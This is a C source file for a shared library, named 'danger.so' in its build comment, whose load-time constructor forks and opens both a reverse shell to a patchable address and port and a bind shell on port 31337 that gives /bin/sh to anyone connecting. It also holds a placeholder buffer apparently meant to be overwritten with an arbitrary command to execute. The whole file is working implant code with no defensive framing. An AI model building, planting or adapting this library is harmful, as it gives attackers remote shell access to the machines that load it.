#include<stdio.h>
// #include<stdlib.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>

// gcc -fPIC -shared -o danger.so danger.c

static unsigned int parseDecimal ( const char** pchCursor ) {
    unsigned int nVal = 0;
    char chNow;
    while ( chNow = **pchCursor, chNow >= '0' && chNow <= '9' )
    {
        //shift digit in
        nVal *= 10;
        nVal += chNow - '0';
        ++*pchCursor;
    }
    return nVal;
}

void rev_shell() {
    char *server_ip="127.000.000.001";
    char *port_s = "13337";
    uint32_t server_port= parseDecimal(&port_s);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
    if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
        return;
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}

void bind_shell() {
    int pid = fork();
    if (pid > 0) {
        return;
    }
    char *port_s = "31337";
    uint32_t port = parseDecimal(&port_s);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    listen(sock, 0);
    int client_sock = accept(sock, NULL, NULL);
    dup2(client_sock, 0);
    dup2(client_sock, 1);
    dup2(client_sock, 2);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}

void cmd_execute() {
    // 412 * 'A' buffer
    char *cmdline = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    if (cmdline[0] != 'A') {
        char *args[] = {
            "/bin/sh",
            "-c",
            cmdline,
            NULL,
        };
        // printf("Execute! %s -c '%s'\n", args[0], args[2] );
        execve(args[0], args, NULL);
    }
}

__attribute__((constructor)) static void reverse_shell(void)
{
    int pid = fork();
    if (pid > 0) {
        return;
    }
    pid = fork();
    if (pid > 0) {
        bind_shell();
        return;
    } else {
        rev_shell();
        return;
    }
}
